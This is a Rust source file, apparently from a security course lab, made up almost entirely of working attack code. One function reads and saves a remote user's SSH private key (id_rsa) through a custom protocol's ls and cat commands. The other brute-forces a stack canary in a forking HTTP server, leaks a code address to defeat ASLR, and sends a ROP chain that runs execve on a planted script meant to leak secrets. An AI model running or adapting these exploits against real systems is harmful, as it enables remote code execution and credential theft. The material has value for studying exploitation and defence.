use crate::shared;
use anyhow::Result;
use std::fs::File;
use std::io::{BufRead, BufReader, BufWriter, Read, Seek, SeekFrom, Write};
use std::net::TcpStream;
use std::{thread, time::Duration};

// Local resources
const PRIVATE_KEY_PATH: &str = "resources/server_private_key";

// Remote paths
const PSLP_LOG: &str = "/home/psuser/pslp.log"; // "/tmp/898fff5a-56bf-4444-ace2-eadac658b363/pslp.log"
const PSDATA_LOG: &str = "/home/psuser/ps_data.log"; // "/tmp/898fff5a-56bf-4444-ace2-eadac658b363/ps_data.log"

#[allow(dead_code)]
pub fn leak_server_private_key() -> Result<()> {
    let (cipher, mut stream) = shared::connect()?;

    let directory = "/home/lpuser/.ssh";
    let file_name = "id_rsa";

    let uuid_param = format!("{}{}{}", shared::PARAM_UUID, shared::UUID_LEN, shared::UUID);
    let dir_bytes = hex::encode(directory.as_bytes());
    let file_name_bytes = hex::encode(file_name.as_bytes());
    let dir_len = hex::encode(&(dir_bytes.len() / 2).to_be_bytes()[6..]);
    let file_name_len = hex::encode(&(file_name_bytes.len() / 2).to_be_bytes()[6..]);
    let ls_params = format!(
        "{}{}{}{}",
        uuid_param,
        shared::PARAM_DIRNAME,
        dir_len,
        dir_bytes
    );
    let cat_params = format!(
        "{}{}{}{}",
        ls_params,
        shared::PARAM_FILENAME,
        file_name_len,
        file_name_bytes
    );

    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_INIT, &uuid_param)?;
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_LS, &ls_params)?;
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_CAT, &cat_params)?;
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_FIN, "")?;

    let responses = shared::get_responses(&cipher, &mut stream)?;

    let ls_body = shared::get_message_body(&responses[1]);
    println!("$ ls {}\n{}", directory, String::from_utf8_lossy(ls_body));

    let cat_res = shared::get_message_body(&responses[2]);
    println!(
        "$ cat {}/{}\n{}",
        directory,
        file_name,
        String::from_utf8_lossy(cat_res)
    );

    let output = File::create(PRIVATE_KEY_PATH)?;
    let mut buf_write = BufWriter::new(output);
    buf_write.write_all(cat_res)?;

    Ok(())
}

pub fn http_exploit() -> Result<()> {
    let mut overflow = "abbbbbbbb".as_bytes().to_vec();
    let overflow_to_return_ptr = overflow.len() + 8;

    // Hack: hardcode canary for testing
    // overflow.extend_from_slice(&[0x00, 0xd0, 0x95, 0xd6, 0x86, 0xa3, 0x09, 0x61]);

    // First, figure out the stack canary using the Diehard technique from Lab7
    // The server clones its process to handle each incoming request
    // The cloning duplicates the canary value so we can submit a ton of requests and guess the canary
    // We do this by iterating through the possible canary values one byte at a time then monitor how the the process exits
    // (stack smashing or clean)
    let pslp_log = File::open(PSLP_LOG)?;
    let mut pslp_log_buf_read = BufReader::new(pslp_log);
    pslp_log_buf_read.seek(SeekFrom::End(0))?;
    let mut lines = pslp_log_buf_read.lines();
    while overflow.len() < overflow_to_return_ptr {
        for byte in 0_u8..=255 {
            overflow.push(byte);
            send_http_req(&overflow)?;
            let status = lines.next().unwrap()?;
            if status == "*** stack smashing detected ***: <unknown> terminated" {
                overflow.pop();
            } else {
                break;
            }
        }
        println!("Overflow: {}", hex::encode(&overflow));
    }

    // Now that we have the stack canary, need to pad up to the return pointer (overwritting saved RBX, R12 and RBP)
    overflow.extend_from_slice("ccccccccddddddddeeeeeeee".as_bytes());

    // Leak a code address so we can build a ROP chain
    // Strategy is to overwrite lower bytes of the return pointer to change it to point to write/fprintf function
    // Due to ASLR, we need to loop our logic to find the right address of the function
    // Should be quick as there are only 16 possibilities
    let psdata_log = File::open(PSDATA_LOG)?;
    let mut psdata_log_buf_read = BufReader::new(psdata_log);
    let mut addr = 0_u64;
    for byte in (0x0e..=0xfe).step_by(0x10) {
        let mut overflow = overflow.clone();
        overflow.push(0xdf);
        overflow.push(byte);
        send_http_req(&overflow)?;
        psdata_log_buf_read.seek(SeekFrom::End(-58))?;
        let mut buffer = [0_u8; 8];
        psdata_log_buf_read.read_exact(&mut buffer)?;
        let value = u64::from_le_bytes(buffer) - 0x8f27;
        if (0x7f00_0000_0000..0x8000_0000_0000).contains(&value) {
            println!("Address: {:x}", value);
            addr = value;
            break;
        }
    }
    assert_ne!(addr, 0);

    // Now that we got a code address, lets execute our bash script by injecting a ROP chain
    // This ROP chain will execute an execve syscall and call "/tmp/.x"
    // RAX: 0x3B (execve)
    // RDI: filename ptr
    // RSI: NULL
    // RDX: NULL
    let syscall_gadget: u64 = 0xa14c; // syscall;
    let pop_rax_gadget: u64 = 0x877f; // pop rax; ret;
    let pop_rdi_gadget: u64 = 0x8876; // pop rdi; ret;
    let pop_rsi_gadget: u64 = 0x1a533; // pop rsi; ret;
    let pop_rdx_gadget: u64 = 0x1cca2; // pop rdx; ret;
    let mov_rdi_rdx_gadget: u64 = 0x3efb3; // mov qword ptr [rdi], rdx; ret;
    let buff: u64 = 0x002e_9512; // writable location
    let script_path: u64 = 0x0078_2e2f_706d_742f; // "/tmp/.x"
    let execve_id: u64 = 0x3b;
    let null_value: u64 = 0;

    // Build and execute ROP chain using the above gadgets (found using ropper)
    update_exploit(&mut overflow, addr + pop_rdi_gadget);
    update_exploit(&mut overflow, addr + buff);
    update_exploit(&mut overflow, addr + pop_rdx_gadget);
    update_exploit(&mut overflow, script_path);
    update_exploit(&mut overflow, addr + mov_rdi_rdx_gadget);
    update_exploit(&mut overflow, addr + pop_rax_gadget);
    update_exploit(&mut overflow, execve_id);
    update_exploit(&mut overflow, addr + pop_rsi_gadget);
    update_exploit(&mut overflow, null_value);
    update_exploit(&mut overflow, addr + pop_rdx_gadget);
    update_exploit(&mut overflow, null_value);
    update_exploit(&mut overflow, addr + syscall_gadget);
    send_http_req(&overflow).unwrap();

    // The bash script that was just executed leaks secrets to the log file that we can now read
    for line in lines {
        let line = line?;
        println!("{}", line);
    }

    Ok(())
}

fn send_http_req(overflow: &[u8]) -> Result<()> {
    let payload = format!(
        "POST / HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Bob\r\nAccept: */*\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{:a<4095}",
        4095 + overflow.len(),
        "a",
    );
    let mut stream = TcpStream::connect("localhost:8080")?;
    stream.write_all(payload.as_bytes())?;
    thread::sleep(Duration::from_millis(50));
    stream.write_all(overflow)?;
    thread::sleep(Duration::from_millis(200));
    Ok(())
}

fn update_exploit(exploit: &mut Vec<u8>, value: u64) {
    exploit.extend_from_slice(&value.to_le_bytes());
}
